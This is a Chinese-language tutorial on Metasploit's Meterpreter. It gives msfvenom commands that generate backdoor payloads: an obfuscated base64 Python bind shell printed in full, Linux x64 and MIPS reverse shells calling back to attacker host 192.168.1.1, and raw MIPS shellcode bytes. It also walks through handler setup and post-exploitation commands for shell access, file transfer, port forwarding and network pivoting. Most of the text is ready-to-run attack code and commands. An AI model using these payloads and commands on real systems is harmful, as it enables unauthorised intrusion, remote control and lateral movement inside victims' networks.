# Meterpreter of Metasploit教程

## 0x01 Backdoor生成
使用MSF套件中msfvenom进行后门载荷的生成
### Meterpreter of Python

>-p 选择payload
>lport 监听端口
>-o 载荷生成位置
```
msfvenom -p  python/meterpreter/bind_tcp lport=6666 -o /tmp/re111
```
生成python文件如下:
```
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw4ODg4KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
```

### Meterpreter of Linux X64
反弹Shell
>LHOST(我方接收主机IP)192.168.1.1    
>LPORT(我方接收监听端口) 8888
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f elf > re111.elf
```
### Shellcode of Linux mipsle

```
msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.1 LPORT=8888 --arch mipsle --platform linux -f py -o re111.py 
```

```
buf =  b""
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c"
buf += b"\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0"
buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
buf += b"\x01\x01"
```
## 0x02 漏洞利用（Exploit）
使用MSF套件中msfconsole，启动
```
msfconsole
```
### 通用的Backdoor会话管理模块

```
msf6> use exploit/multi/handler
#设置payload
msf6 exploit(multi/handler) > set payload python/meterpreter/bind_tcp
#设置RHOST（目标地址）
msf6 exploit(multi/handler) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
#设置LPORT（目标后门服务监听端口）
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
#执行
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 127.0.0.1:8888
[*] Sending stage (39800 bytes) to 127.0.0.1
[*] Meterpreter session 3 opened (127.0.0.1:7812 -> 127.0.0.1:8888 ) at 2022-02-16 11:26:51 +0800

meterpreter >
```
## 0x03 Meterpreter使用

### 基本命令
```
background   # 将当前会话放置后台
sessions   # sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本
info   # 查看已有模块信息
getuid   # 查看当前用户身份
getprivs  # 查看当前用户具备的权限
getpid   # 获取当前进程ID(PID)
sysinfo   # 查看目标机系统信息
irb   # 开启ruby终端
ps   # 查看正在运行的进程    
kill <PID值> # 杀死指定PID进程
idletime     # 查看目标机闲置时间
reboot / shutdown    # 重启/关机
shell    # 进入目标机cmd shell
```

### 文件操作
upload
```
Usage: upload [options] src1 src2 src3 ... destination
-r  Upload recursively
```
downlaod
```
Usage: download [options] src1 src2 src3 ... destination

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

### 端口转发
```
portfwd add -l 7777 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地7777端口
```

### 添加路由
```
run autoroute -h # 查看帮助
run get_local_subnets # 查看目标内网网段地址
run autoroute -s 192.168.183.0/24  # 添加目标网段路由
run autoroute -p  # 查看添加的路由
```

## Ref
- https://xz.aliyun.com/t/6400
